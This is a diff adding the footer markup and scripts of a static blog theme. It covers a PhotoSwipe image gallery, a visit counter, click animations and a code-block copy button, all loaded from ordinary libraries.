+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
